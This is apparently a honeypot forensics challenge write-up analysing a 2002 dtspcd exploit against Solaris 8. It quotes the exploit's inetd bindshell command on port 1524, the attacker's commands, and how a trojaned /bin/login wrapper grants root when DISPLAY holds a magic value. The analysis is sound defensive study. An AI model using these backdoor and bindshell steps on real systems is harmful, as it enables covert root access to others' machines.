The Challenge:
On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc was remotely compromised with the dtspcd exploit. 
What makes this attack interesting is that this is the first time the attack was identified and captured in the wild, resulting a CERT advisory. 
Using the Snort binary capture of the attack, answer the following questions. The honeypot that is attacked is 172.16.1.102.

Questions..
-----------

1. What is a NOP slide, and how is this one different from the NOP slide in the rpc.statd exploit in Scan10? 
2. The attack was on 08 Jan, 2002. Would Snort have generated an alert then for the attack? 
3. In the exploit code, the command "/bin/sh sh -i" is given, what is its purpose, and why is 'sh' shown twice? 
4. The attacker executed a variety of commands on the hacked Solaris box. 
   Which commands were automated by the exploit, which commands were manual by the attacker himself? 
5. What is sun1, and how does it work? 
6. What did you learn from this exercise? 
7. How long did this challenge take you? 

Answers..
---------

1. If I understand the question correctly, a NOP slide is just the reference to a set of 'NO OPeration' intructions in the shellcode. 
   These are used to pad out the buffer before the shellcode. So, for example, if you have an overflow which occours at 256 bytes, but your 
   shellcode is only 117bytes, you can pad the remaining 139bytes with NOP codes. The NOP's in this exploit differ from the ones in scan10 [1] 
   (the rpc.statd compromise) because of the different architecures. A common i386 NOP code is "\x90" and the Sparc NOP code that was used 
   in this example is "\x80\x1c\x40\x11".

2. Snort may/will have picked up the NOP's, but only with a general rule. There was not a public CDE Snort rule until Chris Green composed one 
   on the 14th of January, 2002 [2]. Six days after the compromise on the honeypot which occured on th 8th of January.

3. 'sh' is given twice so that the attacker is given a "#" prompt when connecting to the bindshell, in this case port 1524/tcp. This provides 
   easy detection for an automated tool to check that the attack has resulted in a sucessful compromise. 

4. 

For this part of the exercise I have chosen to use Jeremy Elsons tcpflow [3]

wait3r@blip[~/scan20/tcpflow]$ -> tcpflow -r ../0108\@000-snort.log

Extract any tcp traffic from the supplied snort log.
Then check what kind of information it has managed to salvage using file. 
The filename format (incase you haven't noticed), is:

"source ip"."source port" - "destination ip"."destination port"

wait3r@blip[~/scan20/tcpflow]$ -> file *

Being that the bindshell is on port 1524, know exactly which stream has the commands are in:

wait3r@blip[~/scan20/tcpflow]$ -> more 208.061.001.160.03596-172.016.001.102.01524

chmod 555 sun1
mv sun1 /bin/login
wait3r@blip[~/scan20/tcpflow]$ ->

I initally thought that the following line was simply copy and pasted into the bindshell rather than being automated, but looking at the timestamps via tcpdump:
15:46:18.215738 208.61.1.160.3595 > 172.16.1.102.6112: . ack 2 win 16060 <nop,nop,timestamp 463988080 4160189> (DF)
15:46:18.239726 208.61.1.160.3596 > 172.16.1.102.ingreslock: S 4294410276:4294410276(0) win 16060 <mss 1460,sackOK,timestamp 463988080 0,nop,wscale 0> (DF)

The first line is the final attack, and the second is the initial SYN to the bindshell on tcp/1524. There is too small a timeframe inbetween for it not 
to be automated. The following line is the commands issued.

uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`

For Arin information on 218.7.3.19, see appendix 5.

The manual commands, start with the 'w', checking to see if anyone was logged in. The attacker then proceeded obtain his file, "sun1", from the 
anonymous ftp server on 64.224.118.115 [4].
 
5. As we can see from the above captured commands, the attacker transfers 'sun1' in binary mode. From our initial tcpflow output we can see that 
   the file:

"064.224.118.115.00020-172.016.001.102.33514" is the Solaris/Sparc binary of 'sun1'. This is also confirmed by the source port being 20/tcp.

wait3r@blip[~/scan20/tcpflow]$ -> cp 064.224.118.115.00020-172.016.001.102.33514 sun1

It is of course a trojaned /bin/login wrapper - same idea as bj.c [5] except using the DISPLAY enviroment variable instead of TERM. It is more 
likely to be the other public login wrapper ulogin.c by Tragedy from etC! [6].
It also looks fairly simple. We can check this like so:


# uname -rs
SunOS 5.8
# mv /bin/login /bin/login.bak
# ls -l sun1
-rwx------   1 root  other       89776 Apr 15 11:30 sun1
# mv sun1 /bin/login;chmod 4555 /bin/login
# DISPLAY=pairc;export DISPLAY
# telnet 0
Trying 0.0.0.0...
Connected to 0.
Escape character is '^]'.

SunOS 5.8

# whoami
root
#

There we have it, if your DISPLAY is equal to 'pirc' you get dropped at a root prompt. From the binary (and the commands from the bindshell) we 
can tell that the original /bin/login binary is moved to: "/usr/lib/libfl.k". We can also test this by doing: 

# cat >/usr/lib/libfl.k
#!/bin/sh
echo ".. /usr/lib/libfl.k has been called."
^D
#

This time we unset out DISPLAY env because we do not want to trigger the trojan:

# unset DISPLAY
# telnet 0 
Trying 0.0.0.0...
Connected to 0.
Escape character is '^]'.

SunOS 5.8

.. /usr/lib/libfl.k has been called.

Connection closed by foreign host.

As thought, if the DISPLAY env isn't set to pirc the trojaned wrapper will call /usr/lib/libfl.k.

6. This is a classic example of why honeypots are useful to the security community.
7. The exercise took me probably a couple of hours on and off for research, then an hour and a half for writing it up.

Bonus Question:
---------------
One of the commands executed during the attack is:

echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 


This shows the attacker what the process id that their bindshell is running from. On a sucessful root compromise the exploit runs:
/bin/ksh    -c  echo "ingreslock stream tcp nowait root /bin/sh sh -i">/tmp/x;/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f /tmp/x 

This is shown in the capture files:
wait3r@blip[~/scan20/tcpflow]$ -> grep "/tmp/x " *
Binary file 208.061.001.160.03592-172.016.001.102.06112 matches
Binary file 208.061.001.160.03593-172.016.001.102.06112 matches
Binary file 208.061.001.160.03594-172.016.001.102.06112 matches
Binary file 208.061.001.160.03595-172.016.001.102.06112 matches

A bindshell is created so they can connect to ingreslock (port 1524/tcp) and have an interactive shell. 'BD' I would assume, stands for backdoor.
